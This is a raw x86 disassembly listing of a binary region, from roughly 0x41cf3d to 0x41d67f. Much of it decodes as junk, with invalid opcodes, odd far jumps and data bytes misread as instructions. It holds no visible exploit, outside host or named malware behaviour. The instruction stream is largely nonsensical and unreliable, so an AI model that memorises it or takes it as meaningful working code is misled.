  41cf3d:	mov    eax,0x671fda72
  41cf42:	push   cs
  41cf43:	push   ecx
  41cf44:	xor    al,0xac
  41cf46:	add    DWORD PTR [eax],eax
  41cf48:	lods   eax,DWORD PTR ds:[esi]
  41cf49:	add    BYTE PTR [eax],al
  41cf4b:	add    BYTE PTR [edi+edx*1-0x4f68ded],dh
  41cf52:	popf   
  41cf53:	adc    BYTE PTR [ecx-0x36fdc003],ah
  41cf59:	inc    esi
  41cf5a:	jmp    0x41cf65
  41cf5c:	dec    ebx
  41cf5d:	int3   
  41cf5e:	push   ecx
  41cf5f:	mov    ebp,0xc7448a87
  41cf64:	popa   
  41cf65:	cs call 0x231fb090
  41cf6b:	push   ds
  41cf6c:	mov    esi,0xb83a54a9
  41cf71:	mov    ch,BYTE PTR ds:0xdc8f1754
  41cf77:	mov    edx,edi
  41cf79:	sbb    eax,0xde0704c1
  41cf7e:	and    BYTE PTR [esi],bl
  41cf80:	sbb    esi,DWORD PTR [edi]
  41cf82:	xchg   esi,eax
  41cf83:	aaa    
  41cf84:	sbb    cl,cl
  41cf86:	xchg   edx,eax
  41cf87:	and    eax,0x58b56afa
  41cf8c:	mov    dh,BYTE PTR [eax]
  41cf8e:	push   ebp
  41cf8f:	xchg   ecx,eax
  41cf90:	adc    esp,DWORD PTR [esi]
  41cf92:	bound  esp,QWORD PTR [edi]
  41cf94:	adc    eax,0x7fefb2f2
  41cf99:	dec    edi
  41cf9a:	pop    ds
  41cf9b:	pop    ebp
  41cf9c:	outs   dx,DWORD PTR ds:[esi]
  41cf9d:	cmp    al,0x88
  41cf9f:	(bad)  
  41cfa1:	out    dx,al
  41cfa2:	push   0x9dc4dd33
  41cfa7:	es sbb al,0x80
  41cfaa:	sbb    al,0x4f
  41cfac:	sbb    eax,0xc1fd7c79
  41cfb1:	and    BYTE PTR [edx+0xf60298f],bl
  41cfb7:	xchg   esp,eax
  41cfb8:	in     al,dx
  41cfb9:	dec    ecx
  41cfba:	xchg   esp,eax
  41cfbb:	push   edi
  41cfbc:	imul   edx,ecx,0xa3e46426
  41cfc2:	shl    ecx,1
  41cfc4:	lock sub ah,dh
  41cfc7:	ret    
  41cfc8:	push   ds
  41cfc9:	test   al,0x69
  41cfcb:	enter  0x49b9,0x7a
  41cfcf:	adc    ebx,esp
  41cfd1:	rol    DWORD PTR [esi+esi*8-0x2a3d814a],cl
  41cfd8:	mov    ebp,0x31dbb5e3
  41cfdd:	cmp    ebp,ebx
  41cfdf:	lock jg 0x41cffa
  41cfe2:	mov    ?,WORD PTR [ebp-0x4b]
  41cfe5:	cwde   
  41cfe6:	inc    eax
  41cfe7:	call   FWORD PTR [esi-0x441a0b15]
  41cfed:	xor    DWORD PTR [ecx],edx
  41cfef:	dec    esp
  41cff0:	enter  0x9f8d,0x24
  41cff4:	jmp    DWORD PTR ds:0x85e1e4
	...
  41d002:	add    BYTE PTR [eax],al
  41d004:	ret    
  41d005:	or     eax,0xefee66a6
  41d00a:	ret    
  41d00b:	lods   eax,DWORD PTR ds:[esi]
  41d00c:	sub    al,0xb8
  41d00e:	mov    ds:0x9e1cdb47,eax
  41d013:	mov    edx,0x1ace1
  41d018:	lods   eax,DWORD PTR ds:[esi]
  41d019:	add    BYTE PTR [eax],al
  41d01b:	add    BYTE PTR [edi],bh
  41d01d:	add    BYTE PTR ss:[ebx],cl
  41d020:	lds    edx,FWORD PTR [esi]
  41d022:	xchg   ebx,eax
  41d023:	jo     0x41d02e
  41d025:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d026:	stos   DWORD PTR es:[edi],eax
  41d027:	mov    edi,0xedeb3527
  41d02c:	jmp    0x41d0a6
  41d02e:	fs push cs
  41d030:	retf   0xe1b6
  41d033:	pop    ss
  41d034:	clc    
  41d035:	cmp    edx,DWORD PTR ds:0x84010af4
  41d03b:	xor    edi,esi
  41d03d:	mov    edx,DWORD PTR [edx]
  41d03f:	out    dx,al
  41d040:	mov    ebx,0x369a33c9
  41d045:	mov    ebp,0xcce76af1
  41d04a:	push   ebp
  41d04b:	xor    DWORD PTR [ebx+0xd00cf19],0x5339be11
  41d055:	jmp    0x8b7e:0x7ce0bf02
  41d05c:	and    eax,0x4aa4ce4c
  41d061:	mov    dh,0x47
  41d063:	inc    esi
  41d064:	fwait
  41d065:	ret    0x4cac
  41d068:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d069:	and    al,0x7c
  41d06b:	call   0xb52b:0xb94f6e02
  41d072:	imul   ecx,DWORD PTR [ecx+0x60],0xfa4bdb1a
  41d079:	stos   DWORD PTR es:[edi],eax
  41d07a:	in     eax,dx
  41d07b:	inc    edx
  41d07c:	sbb    bl,BYTE PTR [ecx-0x44]
  41d07f:	mov    eax,0x24031983
  41d084:	fstp   QWORD PTR [edx+0x3508bd37]
  41d08a:	cli    
  41d08b:	(bad)  
  41d08d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d08e:	pop    ss
  41d08f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d090:	cmp    DWORD PTR [esi-0xb161860],ecx
  41d096:	inc    esp
  41d097:	imul   edi,DWORD PTR [edi+0xc11ac0f],0x7b054c9c
  41d0a1:	mul    DWORD PTR [esi]
  41d0a3:	xor    dh,BYTE PTR [edi+ebp*4]
  41d0a6:	test   al,0x90
  41d0a8:	and    DWORD PTR [esi],edx
  41d0aa:	lea    ebx,[ecx+0x6b9723b5]
  41d0b0:	lahf   
  41d0b1:	lahf   
  41d0b2:	mov    edi,0xe1441b6d
  41d0b7:	mov    ebx,0x540bab66
  41d0bc:	test   DWORD PTR [edi],ebx
  41d0be:	and    eax,0x58740680
  41d0c3:	and    esp,DWORD PTR [ebp+0x28]
  41d0c6:	or     al,0x93
  41d0c8:	stos   DWORD PTR es:[edi],eax
	...
  41d0d1:	add    BYTE PTR [eax],al
  41d0d3:	add    cl,bl
  41d0d5:	ret    0x4905
  41d0d8:	pop    ds
  41d0d9:	iret   
  41d0da:	fst    st(2)
  41d0dc:	enter  0xf86f,0xd2
  41d0e0:	ficom  WORD PTR [eax-0x48]
  41d0e3:	fmul   DWORD PTR [esi-0x52fffe53]
  41d0e9:	add    BYTE PTR [eax],al
  41d0eb:	add    BYTE PTR [eax],bl
  41d0ed:	xor    edi,0xffffffe3
  41d0f0:	and    BYTE PTR [ecx],cl
  41d0f2:	sbb    DWORD PTR [ebp+0x1b863b64],edi
  41d0f8:	jle    0x41d12f
  41d0fa:	lea    esi,[ecx-0x3c410023]
  41d100:	xor    edx,DWORD PTR [ebp-0x37a36508]
  41d106:	aaa    
  41d107:	push   esp
  41d108:	sti    
  41d109:	xchg   ebp,eax
  41d10a:	xchg   edx,eax
  41d10b:	push   esi
  41d10c:	dec    esp
  41d10d:	sbb    BYTE PTR [edx-0x11],dh
  41d110:	and    dl,BYTE PTR [eax-0x32ffeb48]
  41d116:	pushf  
  41d117:	int3   
  41d118:	arpl   WORD PTR [esi+ebx*8+0x4d303bd0],ax
  41d11f:	std    
  41d120:	mov    esi,DWORD PTR [ebp+0x48]
  41d123:	fldcw  WORD PTR [ecx-0x6018ed74]
  41d129:	mov    edi,0x9e774e23
  41d12e:	retf   
  41d12f:	sub    bh,BYTE PTR [edx]
  41d131:	cli    
  41d132:	mov    esp,DWORD PTR [edi]
  41d134:	jnp    0x41d0f0
  41d136:	push   ss
  41d137:	fstp   TBYTE PTR ds:0x5d8d392e
  41d13d:	pop    ss
  41d13e:	cli    
  41d13f:	or     ebx,DWORD PTR [ebx]
  41d141:	lds    esp,FWORD PTR [ebx-0x1]
  41d144:	mov    edx,0x1a79bddb
  41d149:	or     DWORD PTR [edx+0xe5c3fc3],ebp
  41d14f:	mov    cl,0x4
  41d151:	xor    eax,0xe6276b01
  41d156:	push   edx
  41d157:	popf   
  41d158:	push   esp
  41d159:	(bad)  
  41d15a:	lds    edx,FWORD PTR [edi-0x2]
  41d15d:	sti    
  41d15e:	pop    dx
  41d160:	lods   al,BYTE PTR ds:[esi]
  41d161:	inc    ebp
  41d162:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d163:	sbb    DWORD PTR ds:0x3dde9378,eax
  41d169:	mov    edi,?
  41d16b:	loope  0x41d1c3
  41d16d:	or     bl,bl
  41d16f:	fwait
  41d170:	dec    ecx
  41d171:	mov    ds:0x237d4ef8,al
  41d176:	lds    esi,FWORD PTR [ebx]
  41d178:	loop   0x41d1a0
  41d17a:	stc    
  41d17b:	push   0xda7313ff
  41d180:	(bad)  
  41d181:	int    0x36
  41d183:	xchg   BYTE PTR [ebx-0x3176201b],ah
  41d189:	push   esp
  41d18a:	push   es
  41d18b:	mov    eax,ds:0x42a3b57e
  41d190:	sub    esi,DWORD PTR [ebx+0x38aad4a1]
  41d196:	or     DWORD PTR [esi],ebp
  41d198:	out    dx,al
	...
  41d1a1:	add    BYTE PTR [eax],al
  41d1a3:	add    BYTE PTR [ecx+0x5f],ah
  41d1a6:	lock (bad) 
  41d1a8:	(bad)  
  41d1a9:	out    dx,eax
  41d1aa:	repz pop edi
  41d1ac:	mov    dl,0xc5
  41d1ae:	ret    
  41d1af:	in     eax,dx
  41d1b0:	add    ah,dh
  41d1b2:	neg    esp
  41d1b4:	cmp    ebp,DWORD PTR [esi+0x1b0001]
  41d1ba:	add    BYTE PTR [eax],al
  41d1bc:	push   esi
  41d1bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1be:	sbb    DWORD PTR [eax],ebx
  41d1c0:	push   edx
  41d1c1:	dec    esp
  41d1c2:	(bad)  [ecx+0x7c]
  41d1c5:	xchg   dh,ch
  41d1c7:	push   0xfd1590fb
  41d1cc:	jge    0x41d242
  41d1ce:	popf   
  41d1cf:	dec    esi
  41d1d0:	cli    
  41d1d1:	outs   dx,DWORD PTR ds:[esi]
  41d1d2:	mov    ds:0xa9260b1e,al
	...
  41d1e3:	add    BYTE PTR [eax],al
  41d1e5:	pusha  
  41d1e6:	inc    edx
  41d1e7:	add    BYTE PTR [eax+eiz*2],al
  41d1ea:	inc    edx
  41d1eb:	add    BYTE PTR [eax],cl
  41d1ed:	pusha  
  41d1ee:	inc    edx
  41d1ef:	add    BYTE PTR [eax+eiz*2],cl
  41d1f2:	inc    edx
  41d1f3:	add    BYTE PTR [eax],dl
  41d1f5:	pusha  
  41d1f6:	inc    edx
  41d1f7:	add    BYTE PTR [eax+eiz*2],dl
  41d1fa:	inc    edx
  41d1fb:	add    BYTE PTR [eax],bl
  41d1fd:	pusha  
  41d1fe:	inc    edx
  41d1ff:	add    BYTE PTR [eax+eiz*2],bl
  41d202:	inc    edx
  41d203:	add    BYTE PTR [eax],al
  41d205:	jo     0x41d249
  41d207:	add    BYTE PTR [eax+esi*2],al
  41d20a:	inc    edx
  41d20b:	add    BYTE PTR [eax],cl
  41d20d:	jo     0x41d251
  41d20f:	add    BYTE PTR [eax+esi*2],cl
  41d212:	inc    edx
  41d213:	add    BYTE PTR [eax],dl
  41d215:	jo     0x41d259
  41d217:	add    BYTE PTR [eax+esi*2],dl
  41d21a:	inc    edx
  41d21b:	add    BYTE PTR [eax],bl
  41d21d:	jo     0x41d261
  41d21f:	add    BYTE PTR [eax+esi*2],bl
  41d222:	inc    edx
  41d223:	add    BYTE PTR [eax],al
  41d225:	add    BYTE PTR [edx+0x0],0x4
  41d229:	add    BYTE PTR [edx+0x0],0x8
  41d22d:	add    BYTE PTR [edx+0x0],0xc
  41d231:	add    BYTE PTR [edx+0x0],0x10
  41d235:	add    BYTE PTR [edx+0x0],0x14
  41d239:	add    BYTE PTR [edx+0x0],0x18
  41d23d:	add    BYTE PTR [edx+0x0],0x1c
  41d241:	add    BYTE PTR [edx+0x0],0x78
  41d245:	data16 ins BYTE PTR es:[edi],dx
  41d247:	jp     0x41d2a0
  41d249:	jbe    0x41d292
  41d24b:	ja     0x41d290
  41d24d:	js     0x41d297
  41d24f:	jno    0x41d2a1
  41d251:	arpl   WORD PTR [ebx+0x6f],dx
  41d254:	inc    edi
  41d255:	dec    esi
  41d256:	outs   dx,DWORD PTR ds:[esi]
  41d257:	pop    ecx
  41d258:	inc    edi
  41d259:	jb     0x41d2a2
  41d25b:	jns    0x41d2d3
  41d25d:	inc    ecx
  41d25e:	pop    eax
  41d25f:	dec    esp
  41d260:	add    BYTE PTR [eax],al
  41d262:	add    BYTE PTR [eax],al
  41d264:	in     al,dx
  41d265:	aad    0x41
  41d267:	add    ah,dh
  41d269:	aad    0x41
  41d26b:	add    BYTE PTR [esp+edx*8+0xbef0041],ch
  41d272:	mov    dl,0xe
  41d274:	jns    0x41d2c4
  41d276:	xor    BYTE PTR [esi-0x79],cl
  41d279:	dec    edi
  41d27a:	cmp    eax,0x3e4faf4e
  41d27f:	dec    esi
  41d280:	js     0x41d2d0
  41d282:	cmp    ecx,DWORD PTR [esi-0x64]
  41d285:	dec    edi
  41d286:	inc    esp
  41d287:	dec    esi
  41d288:	jae    0x41d2d8
  41d28a:	inc    ecx
  41d28b:	dec    esi
  41d28c:	xor    BYTE PTR [esi+0x40],cl
  41d28f:	dec    esi
  41d290:	pop    esp
  41d291:	pop    ebp
  41d292:	pop    edi
  41d293:	push   edx
  41d294:	cmp    DWORD PTR [esi+0x79],ecx
  41d297:	dec    esi
  41d298:	xor    BYTE PTR [esi-0x79],cl
  41d29b:	dec    edi
  41d29c:	cmp    eax,0x3e4faf4e
  41d2a1:	dec    esi
  41d2a2:	js     0x41d2f2
  41d2a4:	cmp    ecx,DWORD PTR [esi-0x64]
  41d2a7:	dec    edi
  41d2a8:	inc    esp
  41d2a9:	dec    esi
  41d2aa:	mov    DWORD PTR [edi+0x41],ecx
  41d2ad:	dec    esi
  41d2ae:	xor    BYTE PTR [esi+0x40],cl
  41d2b1:	dec    esi
  41d2b2:	pop    esp
  41d2b3:	ins    DWORD PTR es:[edi],dx
  41d2b4:	pop    edi
  41d2b5:	bound  edi,QWORD PTR [ecx]
  41d2b7:	dec    esi
  41d2b8:	jns    0x41d308
  41d2ba:	xor    BYTE PTR [esi-0x80],cl
  41d2bd:	dec    edi
  41d2be:	cmp    eax,0x394e734e
  41d2c3:	dec    esi
  41d2c4:	mov    ds:0x304e3a4f,al
  41d2c9:	dec    esi
  41d2ca:	inc    esi
  41d2cb:	dec    esi
  41d2cc:	pop    esp
  41d2cd:	jge    0x41d32e
  41d2cf:	jb     0x41d340
  41d2d1:	sub    BYTE PTR [esi-0x7d],0x7e
  41d2d5:	xchg   ebx,eax
  41d2d6:	jns    0x41d268
  41d2d8:	aas    
  41d2d9:	dec    esi
  41d2da:	test   BYTE PTR [edi+0x30],cl
  41d2dd:	dec    esi
  41d2de:	test   BYTE PTR [edi+0x3c],cl
  41d2e1:	dec    esi
  41d2e2:	mov    ds:0x734e394f,al
  41d2e7:	dec    esi
  41d2e8:	inc    ebp
  41d2e9:	dec    esi
  41d2ea:	xor    BYTE PTR [esi+0x44],cl
  41d2ed:	dec    esi
  41d2ee:	pop    esp
  41d2ef:	lea    ebx,[edi-0x7e]
  41d2f2:	outs   dx,DWORD PTR ds:[esi]
  41d2f3:	xchg   edx,eax
  41d2f4:	outs   dx,BYTE PTR ds:[esi]
  41d2f5:	xchg   ebx,eax
  41d2f6:	jle    0x41d29b
  41d2f8:	jns    0x41d29a
  41d2fa:	aas    
  41d2fb:	dec    esi
  41d2fc:	test   BYTE PTR [edi+0x30],cl
  41d2ff:	dec    esi
  41d300:	test   BYTE PTR [edi+0x3c],cl
  41d303:	dec    esi
  41d304:	mov    ds:0x894e394f,al
  41d309:	dec    edi
  41d30a:	inc    ebp
  41d30b:	dec    esi
  41d30c:	xor    BYTE PTR [esi+0x44],cl
  41d30f:	dec    esi
  41d310:	pop    esp
  41d311:	popf   
  41d312:	pop    edi
  41d313:	xchg   edx,eax
  41d314:	outs   dx,DWORD PTR ds:[esi]
  41d315:	mov    ds:0xb37ea36e,al
  41d31a:	jns    0x41d2cc
  41d31c:	aas    
  41d31d:	dec    esi
  41d31e:	mov    cs,WORD PTR [edi+0x30]
  41d321:	dec    esi
  41d322:	lods   al,BYTE PTR ds:[esi]
  41d323:	dec    edi
  41d324:	cmp    eax,0x394e734e
  41d329:	dec    esi
  41d32a:	mov    eax,ds:0x304e3a4f
  41d32f:	dec    esi
  41d330:	inc    esp
  41d331:	dec    esi
  41d332:	pop    esp
  41d333:	lods   eax,DWORD PTR ds:[esi]
  41d334:	pop    edi
  41d335:	mov    ds:0xb36eb26f,al
  41d33a:	jle    0x41d2ff
  41d33c:	jns    0x41d2fe
  41d33e:	aas    
  41d33f:	dec    esi
  41d340:	mov    cs,WORD PTR [edi+0x30]
  41d343:	dec    esi
  41d344:	lods   al,BYTE PTR ds:[esi]
  41d345:	dec    edi
  41d346:	cmp    eax,0x394e7e4e
  41d34b:	dec    esi
  41d34c:	lahf   
  41d34d:	dec    edi
  41d34e:	cmp    ecx,DWORD PTR [esi+0x30]
  41d351:	dec    esi
  41d352:	inc    ebp
  41d353:	dec    esi
  41d354:	pop    esp
  41d355:	mov    ebp,0xc26fb25f
  41d35a:	outs   dx,BYTE PTR ds:[esi]
  41d35b:	ret    
  41d35c:	jle    0x41d331
  41d35e:	jns    0x41d330
  41d360:	aas    
  41d361:	dec    esi
  41d362:	mov    cs,WORD PTR [edi+0x30]
  41d365:	dec    esi
  41d366:	lods   al,BYTE PTR ds:[esi]
  41d367:	dec    edi
  41d368:	cmp    eax,0x394f804e
  41d36d:	dec    esi
  41d36e:	lods   al,BYTE PTR ds:[esi]
  41d36f:	dec    edi
  41d370:	cmp    cl,BYTE PTR [esi+0x30]
  41d373:	dec    esi
  41d374:	inc    esi
  41d375:	dec    esi
  41d376:	pop    esp
  41d377:	int    0x5f
  41d379:	ret    0xd26f
  41d37c:	outs   dx,BYTE PTR ds:[esi]
  41d37d:	sar    DWORD PTR [esi-0x1d],cl
  41d380:	jns    0x41d362
  41d382:	aas    
  41d383:	dec    esi
  41d384:	mov    cs,WORD PTR [edi+0x30]
  41d387:	dec    esi
  41d388:	lods   al,BYTE PTR ds:[esi]
  41d389:	dec    edi
  41d38a:	cmp    eax,0x394f834e
  41d38f:	dec    esi
  41d390:	mov    ds:0x304e3a4f,al
  41d395:	dec    esi
  41d396:	inc    esp
  41d397:	dec    esi
  41d398:	pop    esp
  41d399:	fstp   QWORD PTR [edi-0x2e]
  41d39c:	outs   dx,DWORD PTR ds:[esi]
  41d39d:	loop   0x41d40d
  41d39f:	jecxz  0x41d41f
  41d3a1:	repz jns 0x41d394
  41d3a4:	aas    
  41d3a5:	dec    esi
  41d3a6:	lea    ecx,[edi+0x30]
  41d3a9:	dec    esi
  41d3aa:	lahf   
  41d3ab:	dec    edi
  41d3ac:	cmp    eax,0x3c4fa04e
  41d3b1:	dec    esi
  41d3b2:	xor    BYTE PTR [esi+0x3f],cl
  41d3b5:	dec    esi
  41d3b6:	pop    esp
  41d3b7:	in     eax,dx
  41d3b8:	pop    edi
  41d3b9:	loop   0x41d42a
  41d3bb:	repnz outs dx,BYTE PTR ds:[esi]
  41d3bd:	repz jle 0x41d3c3
  41d3c0:	jns    0x41d3c2
  41d3c2:	jle    0x41d3d7
  41d3c4:	jns    0x41d3d6
  41d3c6:	cmp    al,0x4e
  41d3c8:	jg     0x41d418
  41d3ca:	xor    BYTE PTR [esi-0x65],cl
  41d3cd:	dec    edi
  41d3ce:	xor    cl,BYTE PTR [esi-0x80]
  41d3d1:	dec    edi
  41d3d2:	cmp    al,0x4e
  41d3d4:	lods   eax,DWORD PTR ds:[esi]
  41d3d5:	dec    edi
  41d3d6:	cmp    ecx,DWORD PTR [esi+0x30]
  41d3d9:	dec    esi
  41d3da:	inc    ebp
  41d3db:	dec    esi
  41d3dc:	pop    esp
  41d3dd:	or     eax,0x126f025f
  41d3e2:	outs   dx,BYTE PTR ds:[esi]
  41d3e3:	adc    edi,DWORD PTR [esi+0x23]
  41d3e6:	jns    0x41d408
  41d3e8:	aas    
  41d3e9:	dec    esi
  41d3ea:	add    BYTE PTR [eax],al
  41d3ec:	je     0x41d3c0
  41d3ee:	inc    ecx
  41d3ef:	add    BYTE PTR [eax-0x2c],ch
  41d3f2:	inc    ecx
  41d3f3:	add    BYTE PTR [eax-0x2c],dh
  41d3f6:	inc    ecx
  41d3f7:	add    al,bh
  41d3f9:	aad    0x41
  41d3fb:	add    BYTE PTR [ebp+edx*8+0x41],ah
  41d3ff:	add    al,ch
  41d401:	aad    0x41
  41d403:	add    BYTE PTR [eax-0x2c],dl
  41d406:	inc    ecx
  41d407:	add    BYTE PTR [esp+edx*8+0x41],dl
  41d40b:	add    ah,ah
  41d40d:	aad    0x41
  41d40f:	add    BYTE PTR [eax+0xd0041d4],bh
  41d415:	test   eax,0xba36f89c
  41d41a:	pushf  
  41d41b:	clc    
  41d41c:	ins    BYTE PTR es:[edi],dx
  41d41d:	aam    0x41
  41d41f:	add    BYTE PTR [edx*8-0x2acfffbf],bl
  41d426:	inc    ecx
  41d427:	add    BYTE PTR [edx*8-0x2ab3ffbf],bh
  41d42e:	inc    ecx
  41d42f:	add    BYTE PTR [esp+edx*8-0x2d8fffbf],ah
  41d436:	inc    ecx
  41d437:	add    ah,al
  41d439:	aam    0x41
  41d43b:	add    BYTE PTR [esp+edx*8-0x2a03ffbf],dh
  41d442:	inc    ecx
  41d443:	add    BYTE PTR [esi+0x19f89c85],dh
  41d449:	or     edx,DWORD PTR [edi]
  41d44b:	cmp    DWORD PTR [eax-0x2c],0x1c140041
  41d452:	push   ss
  41d453:	or     DWORD PTR [eax],0x7050d
  41d459:	add    BYTE PTR [eax+0x0],al
  41d45c:	cmp    al,BYTE PTR [edx+0x3e]
  41d45f:	ds retf 0x4247
  41d463:	add    BYTE PTR [ebp+0x55],ch
  41d466:	inc    esp
  41d467:	imul   ecx,DWORD PTR [eax],0x86275fa
  41d46d:	in     eax,dx
  41d46e:	inc    BYTE PTR [edi]
  41d470:	aas    
  41d471:	cli    
  41d472:	mov    ds:0x41d46005,eax
  41d477:	add    BYTE PTR [ebp-0x4a07636b],dh
  41d47d:	xchg   esi,eax
  41d47e:	pushf  
  41d47f:	clc    
  41d480:	mov    ah,0x95
  41d482:	pushf  
  41d483:	clc    
  41d484:	mov    ebx,0xbaf89c95
  41d489:	xchg   ebp,eax
  41d48a:	pushf  
  41d48b:	clc    
  41d48c:	mov    ecx,0xb8f89c95
  41d491:	xchg   ebp,eax
  41d492:	pushf  
  41d493:	clc    
  41d494:	mov    edi,0xbef89c95
  41d499:	xchg   ebp,eax
  41d49a:	pushf  
  41d49b:	clc    
  41d49c:	mov    ebp,0xa6f89c95
  41d4a1:	xchg   ebp,eax
  41d4a2:	pushf  
  41d4a3:	clc    
  41d4a4:	jmp    0x41d2:0x686003f9
  41d4ab:	add    BYTE PTR [eax+edx*1+0x77530042],cl
  41d4b2:	jbe    0x41d504
  41d4b4:	mov    dh,0x85
  41d4b6:	pushf  
  41d4b7:	clc    
  41d4b8:	sbb    ecx,ebp
  41d4ba:	push   eax
  41d4bb:	pop    es
  41d4bc:	es pop es
  41d4be:	add    BYTE PTR [eax],al
  41d4c0:	rol    BYTE PTR fs:[ecx+0x0],cl
  41d4c4:	sbb    ecx,DWORD PTR [ebx]
  41d4c6:	add    al,0xe
	...
  41d4f8:	mov    WORD PTR [eax],ss
  41d4fa:	inc    edx
  41d4fb:	add    BYTE PTR [esi+0x67f89c85],dh
  41d501:	pushw  0x68
  41d504:	addr16 push 0x67
  41d507:	pushw  0x6b6a
  41d50b:	push   0x676b67
	...
  41d518:	es aas 
  41d51a:	inc    eax
  41d51b:	add    BYTE PTR [ebp-0x5db060b1],ah
  41d521:	dec    edi
  41d522:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d523:	dec    edi
  41d524:	lahf   
  41d525:	dec    edi
  41d526:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d527:	dec    edi
  41d528:	ins    DWORD PTR es:[edi],dx
  41d529:	dec    esi
  41d52a:	bound  ecx,QWORD PTR [esi+0x30]
  41d52d:	dec    esi
  41d52e:	add    BYTE PTR [eax],al
  41d530:	cdq    
  41d531:	dec    edi
  41d532:	pushf  
  41d533:	dec    edi
  41d534:	fwait
  41d535:	dec    edi
  41d536:	ins    DWORD PTR es:[edi],dx
  41d537:	dec    esi
  41d538:	bound  ecx,QWORD PTR [esi+0x30]
  41d53b:	dec    esi
  41d53c:	scas   eax,DWORD PTR es:[edi]
  41d53d:	dec    edi
  41d53e:	lods   eax,DWORD PTR ds:[esi]
  41d53f:	dec    edi
  41d540:	lahf   
  41d541:	dec    edi
  41d542:	mov    ds:0x624e6d4f,al
  41d547:	dec    esi
  41d548:	xor    BYTE PTR [esi+0x0],cl
  41d54b:	add    BYTE PTR [ebp-0x5bb067b1],ch
  41d551:	dec    edi
  41d552:	test   eax,0xa04f934f
  41d557:	dec    edi
  41d558:	fwait
  41d559:	dec    edi
  41d55a:	xor    BYTE PTR [esi+0x0],cl
  41d55d:	add    BYTE PTR [eax],al
  41d55f:	add    BYTE PTR [eax],al
  41d561:	add    BYTE PTR [eax],al
  41d563:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  41d56a:	mov    WORD PTR [ebp-0x32734274],gs
  41d570:	mov    ebp,ds
  41d572:	mov    ebp,gs
  41d574:	mov    ebp,?
  41d576:	mov    WORD PTR ds:0x2d8c1d8c,cs
  41d57c:	mov    WORD PTR ds:0x6d8c5d8c,?
  41d582:	mov    WORD PTR [edx-0x74],?
  41d585:	jae    0x41d513
  41d587:	jo     0x41d515
  41d589:	jno    0x41d517
  41d58b:	jbe    0x41d519
  41d58d:	ja     0x41d51b
  41d58f:	je     0x41d51d
  41d591:	jne    0x41d51f
  41d593:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  41d59a:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  41d5a0:	lods   al,BYTE PTR ds:[esi]
  41d5a1:	jge    0x41d55f
  41d5a3:	jge    0x41d543
  41d5a5:	(bad)  
  41d5a6:	jns    0x41d61b
  41d5a8:	mov    ecx,0x7d738cb1
  41d5ad:	ins    DWORD PTR es:[edi],dx
  41d5ae:	enter  0x9fc6,0x26
  41d5b2:	jb     0x41d5b7
  41d5b4:	test   eax,0xb956bb17
  41d5b9:	hlt    
  41d5ba:	test   al,0x37
  41d5bc:	test   al,0x7e
  41d5be:	fnstenv [ecx-0x6a]
  41d5c1:	mov    cl,0x6a
  41d5c3:	push   0xffffffce
  41d5c5:	or     BYTE PTR [edx],bl
  41d5c7:	xlat   BYTE PTR ds:[ebx]
  41d5c8:	out    dx,eax
  41d5c9:	add    eax,0x9321d7aa
  41d5ce:	scas   al,BYTE PTR es:[edi]
  41d5cf:	adc    DWORD PTR [esi],esp
  41d5d1:	jge    0x41d5f6
  41d5d3:	fidiv  WORD PTR [edi]
  41d5d5:	leave  
  41d5d6:	hlt    
  41d5d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5d8:	cmp    ax,0x1fc8
  41d5dc:	mov    dh,cl
  41d5de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5df:	(bad)  
  41d5e0:	and    DWORD PTR [eax],ebx
  41d5e2:	and    DWORD PTR [ecx-0x18],esi
  41d5e5:	(bad)  [ebx+0x7]
  41d5e8:	cmc    
  41d5e9:	enter  0x301a,0x40
  41d5ed:	adc    BYTE PTR [edx+0x0],al
  41d5f0:	jno    0x41d658
  41d5f2:	jp     0x41d662
  41d5f4:	pop    eax
  41d5f5:	aam    0x41
  41d5f7:	add    BYTE PTR [esp+edx*8-0x12f7ffbf],bh
  41d5fe:	adc    al,BYTE PTR [edi]
  41d600:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  41d607:	ins    BYTE PTR es:[edi],dx
  41d608:	push   0x49657557
  41d60d:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  41d613:	push   edi
  41d614:	ins    BYTE PTR es:[edi],dx
  41d615:	inc    edx
  41d616:	push   0x76666a73
  41d61b:	inc    edx
  41d61c:	jo     0x41d667
  41d61e:	dec    ebp
  41d61f:	dec    ebp
  41d620:	pop    edx
  41d621:	jp     0x41d67d
  41d623:	jbe    0x41d66b
  41d625:	pop    ecx
  41d626:	jo     0x41d6a0
	...
  41d63c:	inc    ebp
  41d63d:	push   edx
  41d63e:	jb     0x41d6b4
  41d640:	inc    esi
  41d641:	je     0x41d684
  41d643:	inc    esi
  41d644:	jae    0x41d6bc
  41d646:	dec    ebx
  41d647:	gs inc edx
  41d649:	inc    bx
  41d64b:	push   ebp
  41d64c:	jno    0x41d6c4
  41d64e:	ja     0x41d6b7
  41d650:	dec    edi
  41d651:	dec    esp
  41d652:	dec    ebp
  41d653:	inc    edx
  41d654:	jno    0x41d6c7
  41d656:	jae    0x41d6ab
  41d658:	dec    eax
  41d659:	inc    ebp
  41d65a:	inc    esp
  41d65b:	inc    esp
  41d65c:	push   ecx
  41d65d:	dec    edx
  41d65e:	ins    BYTE PTR es:[edi],dx
  41d65f:	dec    ebx
  41d660:	jbe    0x41d6d0
  41d662:	pop    eax
  41d663:	jbe    0x41d6b0
  41d665:	inc    ecx
  41d666:	fs gs jno 0x41d6d7
  41d66a:	push   ebx
  41d66b:	inc    ecx
  41d66c:	add    BYTE PTR [eax],al
  41d66e:	inc    ebx
  41d66f:	outs   dx,BYTE PTR ds:[esi]
  41d670:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  41d674:	push   edx
  41d675:	push   ecx
  41d676:	push   0x74000064
  41d67b:	jne    0x41d6f2
  41d67d:	ins    DWORD PTR es:[edi],dx
  41d67e:	push   ecx
  41d67f:	push   eax
